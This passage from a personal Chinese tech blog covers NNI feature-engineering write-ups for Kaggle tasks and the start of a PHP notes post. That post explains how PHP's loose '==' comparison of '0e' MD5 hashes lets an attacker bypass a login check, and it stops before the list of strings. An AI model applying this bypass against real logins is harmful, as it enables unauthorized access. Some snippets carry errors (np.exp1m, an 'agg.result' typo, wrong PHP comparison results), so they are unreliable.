<h2 id="Task-2-2"><a href="#Task-2-2" class="headerlink" title="Task 2.2"></a>Task 2.2</h2><p>to be continued…</p>
]]></content>
      <tags>
        <tag>NNI</tag>
      </tags>
  </entry>
  <entry>
    <title>NNI Student Program Task3.2.1</title>
    <url>/2021/03/15/NNI-Student-Program-2020-Task3.2.1/</url>
    <content><![CDATA[<h1 id="Task-3-2-1-表格型数据的进阶任务"><a href="#Task-3-2-1-表格型数据的进阶任务" class="headerlink" title="Task 3.2.1 表格型数据的进阶任务"></a>Task 3.2.1 表格型数据的进阶任务</h1><h2 id="电影票房预测：TMDB-Box-Office-Prediction"><a href="#电影票房预测：TMDB-Box-Office-Prediction" class="headerlink" title="电影票房预测：TMDB Box Office Prediction"></a>电影票房预测：TMDB Box Office Prediction</h2><h3 id="特征处理"><a href="#特征处理" class="headerlink" title="特征处理"></a>特征处理</h3><p>首先，可以发现<code>belongs-to-collection</code>，<code>homepage</code>等特征存在缺失值，可根据具体数据类型使用不同策略填补缺失值，例如json数据填补<code>&#39;[]&#39;</code>，<code>runtime</code>用中位数填补等等。</p>
<p>其次，数据中存在异常值，需要人工删去异常数据或对异常数据进行填补，在这种时候，箱型图是很重要的工具。<code>budget</code>特征中，前25%的数据均是0，必然是异常数据，解决方案之一是用剩余<code>budget</code>数据的中位数来对其进行填补。<code>runtime</code>特征中存在338分钟的超长电影，打乱了<code>runtime</code>的规则分布，我们选择将该条数据从训练集中删去。</p>
<p><code>poster-path</code>、<code>imdb-id</code>特征一个是图片链接，一个是id，对模型没有任何直接关系，直接删去。</p>
<p>在两个数据中，<code>status</code>特征99.8%的数据都是Released，那么这个特征根本不能提高分类精确度，因此可以直接删去。</p>
<p><code>release-date</code>为常见的时间序列特征，通过<code>pd.DatetimeIndex</code>类型可以方便地提取年、月、日等新特征。</p>
<p>同时，在直方图中可以观察出<code>revenue</code>和<code>budget</code>数据的分布不均匀，可以通过<code>np.log1p</code>进行平滑处理，这样的预测结果比较符合正态分布，预测准确度能够提高。最终预测的<code>log-revenue</code>通过<code>np.exp1m</code>可还原回正常数据。</p>
<p><code>cast</code>，<code>crew</code>，<code>belongs-to-collection</code>等特征是以json格式存储的，对数据中json的解析，<code>ast.literal_eval</code>能比较方便地完成解析任务。<a href="https://www.kaggle.com/c/tmdb-box-office-prediction/discussion/80045">参考链接</a></p>
<p>对于<code>cast</code>，<code>crew</code>这两个特殊的特征，可以符合实际情况，构造出主演，导演，制片人等有关信息，并且可以对这些信息根据票房高低进行排序，根据主演、导演的排名构造特征，这样的特征对最终所预测的票房相关性较强。另一种方法是使用词向量进行特征提取，后续可以进行尝试。</p>
<a id="more"></a>
<h3 id="人工构造特征"><a href="#人工构造特征" class="headerlink" title="人工构造特征"></a>人工构造特征</h3><p>基于先验知识，大制片厂参与制作，有明星演员，有明星导演的电影，票房一般会比较高。我们可以预先统计出演员、导演、制片厂的排名榜，然后通过这些关键要素的计数多少或存在与否构建新特征。</p>
<p>很多特征中，特征中所包含的元素越多，票房有比较大的几率倾向于越高，如<code>spoken-languages</code>，<code>genres</code>等特征。我们便可以构造count类型的新特征。</p>
<p>最终提交结果的loss是2.13(680/1395)，误差可接受，但有待进一步优化。</p>
<h3 id="使用NNI自动特征工程"><a href="#使用NNI自动特征工程" class="headerlink" title="使用NNI自动特征工程"></a>使用NNI自动特征工程</h3><p>NNI集成了GradientFeatureSelector，该算法能在大数据集上缩小特征范围并找到高阶相关性，提升机器学习的效果与性能。</p>
<p>NNI的GradientFeatureSelector使用方法与sklearn模型大致相同：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> nni.feature_engineering.gradient_selector <span class="keyword">import</span> FeatureGradientSelector</span><br><span class="line"></span><br><span class="line">selector = FeatureGradientSelector(n_features=<span class="number">20</span>)</span><br><span class="line">selector.fit(X_train, y_train)</span><br><span class="line">print(selector.get_selected_features())</span><br></pre></td></tr></table></figure>
<p>相关调用NNI自动特征工具的代码包含在对应的jupyter notebook文件中。</p>
<h3 id="最终结果"><a href="#最终结果" class="headerlink" title="最终结果"></a>最终结果</h3><p>在NNI的帮助下，当NNI特征选择器选择16个特征并且使用<code>GradientBoostingRegressor</code>时，取得了较好的提交结果。</p>
<p>最终提交结果的最好loss是2.09(621/1395)，在原来特征处理的基础上得到了提升。个人推测NNI特征选择器在本题效果不明显的原因是没有在手动特征处理部分提取和构造出足够多的特征，导致了选择空间较小，提升空间也比较受限。</p>
<h2 id="旧金山犯罪分类：San-Francisco-Crime-Classification"><a href="#旧金山犯罪分类：San-Francisco-Crime-Classification" class="headerlink" title="旧金山犯罪分类：San Francisco Crime Classification"></a>旧金山犯罪分类：San Francisco Crime Classification</h2><h3 id="原始特征"><a href="#原始特征" class="headerlink" title="原始特征"></a>原始特征</h3><p>该数据的特征相对较少，特征的处理也并不会想上一道题一样繁琐，不过相应的，针对特征的处理则需要更多的技巧。这道题需要做到39个类别的多分类任务，如果对高阶特征的提取不够充分，效果则会比较一般。</p>
<p>给出的特征中，除了<code>Descript</code>和<code>Resolution</code>之外的特征都很重要，我们逐步分析：</p>
<p>首先，不同的警区，犯罪案件的发生率是不同的，有些警区所在的地区是犯罪高发地。可以通过数据可视化看出：</p>
<img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task3.2.1/task3.2.1_2.png">
<p>可以看出：南部警区犯罪数量明显高于其他警区，Mission和北方警区犯罪数量也相对较多。</p>
<p>信息量较大的还有日期特征，从中可以查看一天中具体时间段的犯罪数量的分布。在这里我们将一天从0点到24点分为6个时间段可视化结果如下：</p>
<img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task3.2.1/task3.23.png">
<p>可以看出，在1代表的凌晨和6代表的夜晚这两个时间段内，犯罪数量相对其他的一个时间段都会高。</p>
<h3 id="特征处理-1"><a href="#特征处理-1" class="headerlink" title="特征处理"></a>特征处理</h3><p><code>X</code>，<code>Y</code>两个特征中，在测试集发现经度为-120.5，纬度为90的异常特征，我们分别使用经纬度的中位数进行替换。替换后的散点图如下：</p>
<img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task3.2.1/task3.2.1_1.png">
<p>替换后可通过<code>sklearn.preprocessing.StandardScaler</code>，对数据进行标准化处理，这样更方便模型进行预测。</p>
<h3 id="人工构造特征-1"><a href="#人工构造特征-1" class="headerlink" title="人工构造特征"></a>人工构造特征</h3><p>对时间序列特征，提取出年、月、日、季度、小时、星期等子特征。并使用one-hot编码展开。</p>
<p>发现地址中具有规律，可根据地址最后两个大写字母种类的不同，构造关于地址的特征。</p>
<p>模型方面，我们使用随机森林进行回归，准确率为27.5%左右，有待提高。</p>
<h3 id="使用NNI"><a href="#使用NNI" class="headerlink" title="使用NNI"></a>使用NNI</h3><p>同样使用NNI的<code>GradientFeatureSelector</code>，从构造出的特征中选取出了18个特征。</p>
<p>使用了NNI的特征选择器后，使用lightGBM算法构建模型，在验证集上的multiloss是2.32，相对原来有一定提高。</p>
<p>使用随机森林模型进行二分类，最优达到了30%的准确率。</p>
<h3 id="最终结果-1"><a href="#最终结果-1" class="headerlink" title="最终结果"></a>最终结果</h3><p>最终提交的模型在测试集上的结果不尽人意，在kaggle上只排到了75%左右，这说明最终模型的泛化效果并不够好，无法很好地完成39种类别的分类任务。</p>
<p>由于对特征工程的认识有限，在特征的处理上只实现了自己的处理思路，这可能也导致我们的模型表现不够优秀。</p>
<h2 id="土壤属性预测：Africa-Soil-Property-Prediction-Challenge"><a href="#土壤属性预测：Africa-Soil-Property-Prediction-Challenge" class="headerlink" title="土壤属性预测：Africa Soil Property Prediction Challenge"></a>土壤属性预测：Africa Soil Property Prediction Challenge</h2><p>multi-label的回归任务其实可以拆分为多个单label的回归任务，通过多次构建模型进行回归来预测各个label的值。</p>
<p>由于原代码只支持二分类任务，这里为了实现multi-label的回归任务，使用了以<code>lightgbm.LGBMRegressor</code>为内置结构的<code>sklearn.multioutput.MultiOutputRegressor</code>。<a href="https://stackoverflow.com/questions/52648383/how-to-get-coefficients-and-feature-importances-from-multioutputregressor">参考链接</a></p>
<h3 id="原始特征-1"><a href="#原始特征-1" class="headerlink" title="原始特征"></a>原始特征</h3><p>原始特征均进行过标准化处理，除了<code>Depth</code>特征可以将字符串变化为01编码，其他特征没有进一步处理的必要。</p>
<h3 id="手动选择建立模型"><a href="#手动选择建立模型" class="headerlink" title="手动选择建立模型"></a>手动选择建立模型</h3><p>使用了sklearn中贝叶斯线性回归模型（BayesianRidge），通过做5次模型的回归，最终kaggle上的loss为0.46489，拟合效果优秀。</p>
<h3 id="使用NNI-AutoFE工具"><a href="#使用NNI-AutoFE工具" class="headerlink" title="使用NNI AutoFE工具"></a>使用NNI AutoFE工具</h3><p>该题目比较特殊，该题目中，绝大部分的特征描述的是针对特定波长的光的吸收能力。</p>
<p>理论上各特征的重要程度并无较大差别，更多的特征往往能够得到更高的预测精确度，在这些特征中进行重要性排序并进行特征选择的意义相对来说不是很大。所以经过权衡考虑后，我们决定跳过使用NNI进一步提升的步骤。</p>
<h2 id="任务总结"><a href="#任务总结" class="headerlink" title="任务总结"></a>任务总结</h2><p>在Task3.2.1的任务中，本小组从零开始学习了特征工程的有关知识，并学会了对常用表格特征的提取与新特征的构造方式，最后还尝试了通过使用NNI的特征工程工具优化模型性能。</p>
<p>由于学习时间较短，水平有限，特征提取与模型训练也没有能做到最好，也没能发挥出NNI特征工程工具的真正效果，希望在日后的学习中能够不断有所长进。</p>
]]></content>
  </entry>
  <entry>
    <title>NNI Student Program 2020 Task3</title>
    <url>/2021/01/29/NNI-Student-Program-2020-Task3/</url>
    <content><![CDATA[<h1 id="Task-3-进阶任务"><a href="#Task-3-进阶任务" class="headerlink" title="Task 3 进阶任务"></a>Task 3 进阶任务</h1><h2 id="特征工程简介"><a href="#特征工程简介" class="headerlink" title="特征工程简介"></a>特征工程简介</h2><p>有这么一句话在业界广泛流传：</p>
<blockquote>
<p>数据和特征决定了机器学习的上限，而模型和算法只是逼近这个上限而已。</p>
</blockquote>
<p>数据是特征的来源，特征是给定算法下模型精确度的最大决定因素，可见提升特征质量意义重大。</p>
<p>特征工程(Feature Engineering)是机器学习的一个重要分支，指的是通过多种数据处理方法，从原始数据提取出若干个能优秀反映问题的特征，以提升最终算法与模型准确率的过程。</p>
<a id="more"></a>
<h2 id="自动特征工程"><a href="#自动特征工程" class="headerlink" title="自动特征工程"></a>自动特征工程</h2><p>自动特征工程是一种新技术，是机器学习发展的一大步。自动特征工程能够在降低时间成本的同时，生成更优秀的特征，从而构建出准确率更高的模型。</p>
<p>利用NNI的自动特征工程实现，我们通过简单调用函数便可实现特征工程的自动调优。</p>
<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul>
<li>nni</li>
<li>numpy</li>
<li>lightgbm: 微软开源算法</li>
<li>pandas: 基于python的数据分析强力工具</li>
<li>sklearn: 集成了特征工程相关的常用函数</li>
</ul>
<p>建议在conda环境下部署自动特征工程python环境。</p>
<p>此外，由于pandas版本更新，直接运行自带项目会报错，实际上只需修改<code>fe_util.py</code>中的<code>agg</code>参数类型即可，大致修改如下：</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">def aggregate(df, num_col, col, stat_list = AGGREGATE_TYPE):</span><br><span class="line"><span class="deletion">-   agg_dict = &#123;&#125;</span></span><br><span class="line"><span class="addition">+   agg_list = []</span></span><br><span class="line">    for i in stat_list:</span><br><span class="line"><span class="deletion">-       agg_dict[(&#x27;AGG_&#123;&#125;_&#123;&#125;_&#123;&#125;&#x27;.format(i, num_col, col)] = i</span></span><br><span class="line"><span class="addition">+       agg_list.append((&#x27;AGG_&#123;&#125;_&#123;&#125;_&#123;&#125;&#x27;.format(i, num_col, col), i))</span></span><br><span class="line"><span class="deletion">-   agg_result = df.groupby([col])[num_col].agg(agg_dict)</span></span><br><span class="line"><span class="addition">+   agg.result = df.groupby([col])[num_col].agg(agg_list)</span></span><br><span class="line">    r = left_merge(df, agg_result, on = [col])</span><br><span class="line">    df = concat([df, r])</span><br><span class="line">    return df</span><br></pre></td></tr></table></figure>
<p>该修改已提交pull request至原项目。</p>
<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><h3 id="配置搜索空间"><a href="#配置搜索空间" class="headerlink" title="配置搜索空间"></a>配置搜索空间</h3><p>NNI的自动特征工程支持count、crosscount、aggregate等一阶与二阶特征运算，配置搜索空间时只需按json格式填写搜索范围。具体填写方法以项目示例搜索空间为例：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;count&quot;</span>:[</span><br><span class="line">        <span class="string">&quot;C1&quot;</span>,<span class="string">&quot;C2&quot;</span>,<span class="string">&quot;C3&quot;</span>,<span class="string">&quot;C4&quot;</span>,<span class="string">&quot;C5&quot;</span>,<span class="string">&quot;C6&quot;</span>,<span class="string">&quot;C7&quot;</span>,<span class="string">&quot;C8&quot;</span>,<span class="string">&quot;C9&quot;</span>,<span class="string">&quot;C10&quot;</span>,</span><br><span class="line">        <span class="string">&quot;C11&quot;</span>,<span class="string">&quot;C12&quot;</span>,<span class="string">&quot;C13&quot;</span>,<span class="string">&quot;C14&quot;</span>,<span class="string">&quot;C15&quot;</span>,<span class="string">&quot;C16&quot;</span>,<span class="string">&quot;C17&quot;</span>,<span class="string">&quot;C18&quot;</span>,<span class="string">&quot;C19&quot;</span>,</span><br><span class="line">        <span class="string">&quot;C20&quot;</span>,<span class="string">&quot;C21&quot;</span>,<span class="string">&quot;C22&quot;</span>,<span class="string">&quot;C23&quot;</span>,<span class="string">&quot;C24&quot;</span>,<span class="string">&quot;C25&quot;</span>,<span class="string">&quot;C26&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;aggregate&quot;</span>:[</span><br><span class="line">        [<span class="string">&quot;I9&quot;</span>,<span class="string">&quot;I10&quot;</span>,<span class="string">&quot;I11&quot;</span>,<span class="string">&quot;I12&quot;</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="string">&quot;C1&quot;</span>,<span class="string">&quot;C2&quot;</span>,<span class="string">&quot;C3&quot;</span>,<span class="string">&quot;C4&quot;</span>,<span class="string">&quot;C5&quot;</span>,<span class="string">&quot;C6&quot;</span>,<span class="string">&quot;C7&quot;</span>,<span class="string">&quot;C8&quot;</span>,<span class="string">&quot;C9&quot;</span>,<span class="string">&quot;C10&quot;</span>,</span><br><span class="line">            <span class="string">&quot;C11&quot;</span>,<span class="string">&quot;C12&quot;</span>,<span class="string">&quot;C13&quot;</span>,<span class="string">&quot;C14&quot;</span>,<span class="string">&quot;C15&quot;</span>,<span class="string">&quot;C16&quot;</span>,<span class="string">&quot;C17&quot;</span>,<span class="string">&quot;C18&quot;</span>,<span class="string">&quot;C19&quot;</span>,</span><br><span class="line">            <span class="string">&quot;C20&quot;</span>,<span class="string">&quot;C21&quot;</span>,<span class="string">&quot;C22&quot;</span>,<span class="string">&quot;C23&quot;</span>,<span class="string">&quot;C24&quot;</span>,<span class="string">&quot;C25&quot;</span>,<span class="string">&quot;C26&quot;</span></span><br><span class="line">        ]</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;crosscount&quot;</span>:[</span><br><span class="line">        [</span><br><span class="line">            <span class="string">&quot;C1&quot;</span>,<span class="string">&quot;C2&quot;</span>,<span class="string">&quot;C3&quot;</span>,<span class="string">&quot;C4&quot;</span>,<span class="string">&quot;C5&quot;</span>,<span class="string">&quot;C6&quot;</span>,<span class="string">&quot;C7&quot;</span>,<span class="string">&quot;C8&quot;</span>,<span class="string">&quot;C9&quot;</span>,<span class="string">&quot;C10&quot;</span>,</span><br><span class="line">            <span class="string">&quot;C11&quot;</span>,<span class="string">&quot;C12&quot;</span>,<span class="string">&quot;C13&quot;</span>,<span class="string">&quot;C14&quot;</span>,<span class="string">&quot;C15&quot;</span>,<span class="string">&quot;C16&quot;</span>,<span class="string">&quot;C17&quot;</span>,<span class="string">&quot;C18&quot;</span>,<span class="string">&quot;C19&quot;</span>,</span><br><span class="line">            <span class="string">&quot;C20&quot;</span>,<span class="string">&quot;C21&quot;</span>,<span class="string">&quot;C22&quot;</span>,<span class="string">&quot;C23&quot;</span>,<span class="string">&quot;C24&quot;</span>,<span class="string">&quot;C25&quot;</span>,<span class="string">&quot;C26&quot;</span></span><br><span class="line">        ],</span><br><span class="line">        [</span><br><span class="line">            <span class="string">&quot;C1&quot;</span>,<span class="string">&quot;C2&quot;</span>,<span class="string">&quot;C3&quot;</span>,<span class="string">&quot;C4&quot;</span>,<span class="string">&quot;C5&quot;</span>,<span class="string">&quot;C6&quot;</span>,<span class="string">&quot;C7&quot;</span>,<span class="string">&quot;C8&quot;</span>,<span class="string">&quot;C9&quot;</span>,<span class="string">&quot;C10&quot;</span>,</span><br><span class="line">            <span class="string">&quot;C11&quot;</span>,<span class="string">&quot;C12&quot;</span>,<span class="string">&quot;C13&quot;</span>,<span class="string">&quot;C14&quot;</span>,<span class="string">&quot;C15&quot;</span>,<span class="string">&quot;C16&quot;</span>,<span class="string">&quot;C17&quot;</span>,<span class="string">&quot;C18&quot;</span>,<span class="string">&quot;C19&quot;</span>,</span><br><span class="line">            <span class="string">&quot;C20&quot;</span>,<span class="string">&quot;C21&quot;</span>,<span class="string">&quot;C22&quot;</span>,<span class="string">&quot;C23&quot;</span>,<span class="string">&quot;C24&quot;</span>,<span class="string">&quot;C25&quot;</span>,<span class="string">&quot;C26&quot;</span></span><br><span class="line">        ]</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="导入tuner"><a href="#导入tuner" class="headerlink" title="导入tuner"></a>导入tuner</h3><p>导入自动特征工程的tuner时，需要在<code>config.yml</code>中的<code>tuner</code>项添加相关信息，其他地方正常填写即可。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">tuner:</span></span><br><span class="line">  <span class="attr">codeDir:</span> <span class="string">.</span></span><br><span class="line">  <span class="attr">classFileName:</span> <span class="string">autofe_tuner.py</span></span><br><span class="line">  <span class="attr">className:</span> <span class="string">AutoFETuner</span></span><br><span class="line">  <span class="attr">classArgs:</span></span><br><span class="line">    <span class="attr">optimize_mode:</span> <span class="string">maximize</span></span><br></pre></td></tr></table></figure>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>Tuner在生成的搜索空间中随机选取一定数量的feature组合，通过<code>nni.get_next_parameter()</code>的接口，以dict的形式返回给单次trial。经一系列处理后运行lightGBM算法，得到最终以AUC形式呈现的结果。</p>
<p>调用代码主体部分如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># get parameter from tuner</span></span><br><span class="line">RECEIVED_PARAMS = nni.get_next_parameter()</span><br><span class="line">logger.info(<span class="string">&quot;Received params:\n&quot;</span>, RECEIVED_PARAMS)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get sample column from parameter</span></span><br><span class="line">df = pd.read_csv(file_name)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;sample_feature&#x27;</span> <span class="keyword">in</span> RECEIVED_PARAMS.keys():</span><br><span class="line">    sample_col = RECEIVED_PARAMS[<span class="string">&#x27;sample_feature&#x27;</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sample_col = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># df: raw feaure + sample_feature</span></span><br><span class="line">df = name2feature(df, sample_col, target_name)</span><br><span class="line">feature_imp, val_score = lgb_model_train(df, _epoch=<span class="number">1000</span>, target_name=target_name,id_index=id_index)</span><br><span class="line"></span><br><span class="line"><span class="comment"># report result to nni</span></span><br><span class="line">nni.report_final_result(&#123;</span><br><span class="line">    <span class="string">&quot;default&quot;</span>:val_score, </span><br><span class="line">    <span class="string">&quot;feature_importance&quot;</span>:feature_imp</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="项目示例运行结果"><a href="#项目示例运行结果" class="headerlink" title="项目示例运行结果"></a>项目示例运行结果</h2><h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task3/task3_1.png">
<h3 id="Top-10-Trials"><a href="#Top-10-Trials" class="headerlink" title="Top 10 Trials"></a>Top 10 Trials</h3><img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task3/task3_2.png">
<h3 id="Default-Metric"><a href="#Default-Metric" class="headerlink" title="Default Metric"></a>Default Metric</h3><img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task3/task3_4.png">
<h3 id="Hyper-parameter"><a href="#Hyper-parameter" class="headerlink" title="Hyper-parameter"></a>Hyper-parameter</h3><img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task3/task3_6.png">
<h3 id="Feature-Importance-of-Top-1-Trial"><a href="#Feature-Importance-of-Top-1-Trial" class="headerlink" title="Feature Importance of Top 1 Trial"></a>Feature Importance of Top 1 Trial</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">         feature_name  split  ...  split_percent  feature_score</span><br><span class="line">5                  I6     39  ...      11.504425       0.145729</span><br><span class="line">4                  I5     20  ...       5.899705       0.067777</span><br><span class="line">85     AGG_max_I9_C17     14  ...       4.129794       0.053053</span><br><span class="line">76      count_C18_C23     11  ...       3.244838       0.031225</span><br><span class="line">43   AGG_mean_I11_C16      9  ...       2.654867       0.029425</span><br><span class="line">..                ...    ...  ...            ...            ...</span><br><span class="line">86    AGG_var_I11_C25      0  ...       0.000000       0.000000</span><br><span class="line">82      count_C12_C20      0  ...       0.000000       0.000000</span><br><span class="line">80       count_C1_C17      0  ...       0.000000       0.000000</span><br><span class="line">77       count_C1_C23      0  ...       0.000000       0.000000</span><br><span class="line">100     count_C15_C21      0  ...       0.000000       0.000000</span><br><span class="line"></span><br><span class="line">[162 rows x 6 columns]</span><br></pre></td></tr></table></figure>
<p>若想要查询某一次trial的feature importance，只需在WebUI中按下Copy as json，再代入原程序运行就可以获得了。</p>
<h2 id="heart数据集运行结果"><a href="#heart数据集运行结果" class="headerlink" title="heart数据集运行结果"></a>heart数据集运行结果</h2><p><a href="http://archive.ics.uci.edu/ml/datasets/Statlog+%28Heart%29">数据集地址</a></p>
<p>heart数据集收集了中老年人是否患心脏病的270条数据，每条数据有13条属性，本质上是一个二分类问题的数据。</p>
<p>我们希望通过特征工程，从数据中挖掘出心脏病患病与其他事件的相关性，从庞杂的数据中得出结论。</p>
<p>初始AUC为0.932367，使用了NNI自动特征工程之后，AUC上升到了0.97343，比原始精确度高出许多。</p>
<h3 id="Overview-1"><a href="#Overview-1" class="headerlink" title="Overview"></a>Overview</h3><img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task3/example1.png">
<h3 id="Top-10-Trials-1"><a href="#Top-10-Trials-1" class="headerlink" title="Top 10 Trials"></a>Top 10 Trials</h3><img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task3/example2.png">
<h3 id="Default"><a href="#Default" class="headerlink" title="Default"></a>Default</h3><p>Sorted Default MetricMetric</p>
<img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task3/example3.png">
<h3 id="Hyper-parameter-1"><a href="#Hyper-parameter-1" class="headerlink" title="Hyper-parameter"></a>Hyper-parameter</h3><img data-src="http://qiniu.garen-wang.top/static/images/NNI-Student-Program-2020-Task3/example4.png">
<h3 id="Feature-Importance-of-Top-1-Trial-1"><a href="#Feature-Importance-of-Top-1-Trial-1" class="headerlink" title="Feature Importance of Top 1 Trial"></a>Feature Importance of Top 1 Trial</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                     feature_name  split  ...  split_percent  feature_score</span><br><span class="line">113          count_chest-pain_sex      4  ...       9.302326       0.197441</span><br><span class="line">37      AGG_var_chest-pain_hr-max      5  ...      11.627907       0.083669</span><br><span class="line">53         AGG_median_age_vessels      3  ...       6.976744       0.075381</span><br><span class="line">0                             age      3  ...       6.976744       0.058558</span><br><span class="line">12                           thal      2  ...       4.651163       0.056385</span><br><span class="line">..                            ...    ...  ...            ...            ...</span><br><span class="line">54            AGG_max_sex_vessels      0  ...       0.000000       0.000000</span><br><span class="line">52   AGG_median_chest-pain_hr-max      0  ...       0.000000       0.000000</span><br><span class="line">51     AGG_median_bs-fasting_thal      0  ...       0.000000       0.000000</span><br><span class="line">50       AGG_mean_age_cholesterol      0  ...       0.000000       0.000000</span><br><span class="line">138            AGG_var_sex_hr-max      0  ...       0.000000       0.000000</span><br><span class="line"></span><br><span class="line">[139 rows x 6 columns]</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>NNI</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP Language Features Summary</title>
    <url>/2021/07/11/PHP-Language-Features-Summary/</url>
    <content><![CDATA[<h2 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h2><h3 id="两种判等类型"><a href="#两种判等类型" class="headerlink" title="两种判等类型"></a>两种判等类型</h3><p>php有两种判等的类型，<code>==</code>与<code>===</code>。</p>
<p>其中，<code>===</code>是强类型的判等，会先判断两边类型是否相等，之后在进行比较。</p>
<p>然而，<code>==</code>是弱类型的判等，会发生隐式类型转换后进行比较。</p>
<a id="more"></a>
<h3 id="NULL、0、”0”、false"><a href="#NULL、0、”0”、false" class="headerlink" title="NULL、0、”0”、false"></a>NULL、0、”0”、false</h3><p>首先给大家看个好玩的：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    var_dump(<span class="number">0</span>==<span class="string">&quot;0&quot;</span>); <span class="comment">// bool(true)</span></span><br><span class="line">    var_dump(<span class="number">0</span>==<span class="literal">NULL</span>); <span class="comment">// bool(true)</span></span><br><span class="line">    var_dump(<span class="number">0</span>==<span class="literal">false</span>); <span class="comment">// bool(true)</span></span><br><span class="line"></span><br><span class="line">    var_dump(<span class="string">&quot;0&quot;</span>==<span class="literal">false</span>); <span class="comment">// bool(true)</span></span><br><span class="line">    var_dump(<span class="string">&quot;0&quot;</span>==<span class="literal">NULL</span>); <span class="comment">// bool(false)</span></span><br><span class="line">    var_dump(<span class="string">&quot;0&quot;</span>==<span class="number">0</span>); <span class="comment">// bool(false)</span></span><br><span class="line"></span><br><span class="line">    var_dump(<span class="literal">NULL</span>==<span class="string">&quot;0&quot;</span>); <span class="comment">// bool(false)</span></span><br><span class="line">    var_dump(<span class="literal">NULL</span>==<span class="number">0</span>); <span class="comment">// bool(true)</span></span><br><span class="line">    var_dump(<span class="literal">NULL</span>==<span class="literal">false</span>); <span class="comment">// bool(true)</span></span><br><span class="line"></span><br><span class="line">    var_dump(<span class="literal">false</span>==<span class="string">&quot;0&quot;</span>); <span class="comment">// bool(true)</span></span><br><span class="line">    var_dump(<span class="literal">false</span>==<span class="literal">NULL</span>); <span class="comment">// bool(true)</span></span><br><span class="line">    var_dump(<span class="literal">false</span>==<span class="number">0</span>); <span class="comment">// bool(true)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="字符串与数字的弱类型判等"><a href="#字符串与数字的弱类型判等" class="headerlink" title="字符串与数字的弱类型判等"></a>字符串与数字的弱类型判等</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="string">&quot;admin&quot;</span>==<span class="number">0</span>);  <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">&quot;1admin&quot;</span>==<span class="number">1</span>); <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">&quot;admin1&quot;</span>==<span class="number">1</span>) <span class="comment">//false</span></span><br><span class="line">var_dump(<span class="string">&quot;admin1&quot;</span>==<span class="number">0</span>) <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">&quot;0e123456&quot;</span>==<span class="string">&quot;0e4456789&quot;</span>); <span class="comment">//true, 0e123456 = 0e4456789 = 0 in scientific notation</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>&quot;1admin&quot;==1</code>，<code>&quot;admin1&quot;==0</code>说明字符串隐式转数值时只看最前面的合法可转的数值表示。</p>
<h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><h3 id="MD5碰撞绕过"><a href="#MD5碰撞绕过" class="headerlink" title="MD5碰撞绕过"></a>MD5碰撞绕过</h3><p>当我们需要判断两个字符串的MD5值是否相同，我们通常会这么做：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (md5(<span class="variable">$Username</span>) != md5(<span class="variable">$Password</span>)) &#123;<span class="variable">$logined</span> = <span class="literal">false</span>; &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>那么利用上面<code>&quot;0e123456&quot;==&quot;0e4456789&quot;</code>的性质，如果存在两个字符串，它们的前两位都恰好是<code>0e</code>，那么就成功绕过了这个分支。</p>
<p>几个MD5值以<code>0e</code>开头的字符串：</p>
